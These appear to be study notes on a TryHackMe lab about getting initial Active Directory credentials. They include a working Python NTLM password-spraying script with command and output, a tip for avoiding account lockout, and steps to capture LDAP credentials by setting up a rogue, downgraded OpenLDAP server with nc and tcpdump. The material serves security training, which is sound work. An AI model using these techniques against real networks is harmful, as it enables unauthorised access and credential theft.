This is the first step, to get a first set of credentials, even a low privileged is sufficient
  - We can recover AD credentials targeting internet facing system, or rogue device using tools like:
     - NTLM Authenticated Services
     - LDAP Bind credentials
     - Authentication Relays
     - Microsoft Deployment Toolkit
     - Configuration Files

- Configure DNS:  systemd-resolve --interface breachad --set-dns $THMDCIP --set-domain za.tryhackme.com

### OSINT and Phishing
- Open Source Intelligence: discover publicly disclosed information like stackoverflow, Github; HaveIBeenPwned, DeHashed (Websites which discloses publicly known data in breach)
- Phihing involves users providing their credentials on a malicious web page abd ask tem to run RAT (Remote Acess Trojan).

<details> 
<summary> 1. NTLM Authenticated Services </summary>
  
- New Technolgy Lan Manager (NTLM) is suite of security protocals used to authenticate user's identities in AD.
- It uses challenge-response-based scheme called NetNTLM / Windows Authentication / NTLM Authentication.
  - NetNTLM can be exposed to internet sometimes. Some examples are below:
  - Internal hosted Exchange (Mail) servers exposed to Outlook web App (OWA) login portal
  - RDP sevice exposed to internet
  - VPN endpoints integrated with AD are exposed
  - Internet facing Web apps usinf NetNTLM
- Application is authenticating on behalf of user, but not authenticating user directly. This prevents storing of AD credentials.
![image](https://github.com/Vamckis/Container-Security/assets/71128825/8e92fe08-ff89-4316-af32-3deafb5b2398)

#### Brute-force Login attacks:
- Tip: Insted of using one username and multiple passwords, use one password and multple usernames. This will avoid user acount lock.
- Normally Organisation first password wouldbe "Changeme123"

#### Password Spraying:

``` 
python ntlm_passwordspray.py -u <userfile> -f <url = za.tryhackme.com> -p <password = Changeme123> -a <attack url = http://ntlmauth.tryhackme.com>
```
```
# ntlm_paswordspray.py - Python Script for password spraying attack
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```

```
NTLM Password Spraying Attack
[thm@thm]$ python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
[*] Starting passwords spray attack using the following password: Changeme123
[-] Failed login with Username: anthony.reynolds
[-] Failed login with Username: henry.taylor
[...]
[+] Valid credential pair found! Username: [...] Password: Changeme123
[-] Failed login with Username: louise.talbot
[...]
[*] Password spray attack completed, [X] valid credential pairs found
```

- We can have first pair of credentails by OSINT + NetNTLM password spraying
  
</details>

<details>
    <summary>2. LDAP Bind Credentials</summary>

- LDAP (Lightweight Directory Access Protocol) is similar to NTLM, but application directly uses user's credentails.
- Third paty apps which are integarted to AD uses LDAP (like Gitlab, Jenkins, VPNs, Printers)

![image](https://github.com/Vamckis/Container-Security/assets/71128825/8c9a057a-ce2f-4302-8582-7044b1c03756)

#### LDAP Pass-back Attacks:
- It can be performed when we gain access to device / printer configuration, where LDAP parameters are specified.
- Performing LDAP Pass-back:
  - e.g: There is a printer in network, where admin websited doesnot need credentials.
![image](https://github.com/Vamckis/Container-Security/assets/71128825/3c77c949-b2e6-4c14-b053-a919fbc3a913)
  - Press on "Test Settigs" link, printer will make authentication request to Domain Controller to test LDAP credentials.  

![image](https://github.com/Vamckis/Container-Security/assets/71128825/d78f1e62-70ef-4cf4-b561-11a35f1255ec)

  - we can listen to port 389 (default port for printer)
```
nc -lvp 389
```
  - If printer user secure autentication method, we wont be able to see credentials. In this case, we have to host a rogue LDAP server.

- Hosting a Rogue LDAP Server:
  - use OpenLDAP to host rogue LDAP server

```
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```
  - Downgrade LDAP server to support only PLAIN and LOGIN authentication methods. So that we can see printer authentication traffic.
    - for this, need to create new ldif file with below content:

```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```
  - The file has the following properties:
     - olcSaslSecProps: Specifies the SASL security properties
     - noanonymous: Disables mechanisms that support anonymous login
     - minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.

  - patch LDAP server with ldif file:
```
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```
- Capturing LDAP Credentails:
  - Click on Test settings and Get TCP dump, which will be in plain text due to vulnerable rogue server settings.
```
sudo tcpdump -SX -i breachad tcp port 389
```
</details>

<details>
<summary>Authentication Relays</summary>
  
</details>
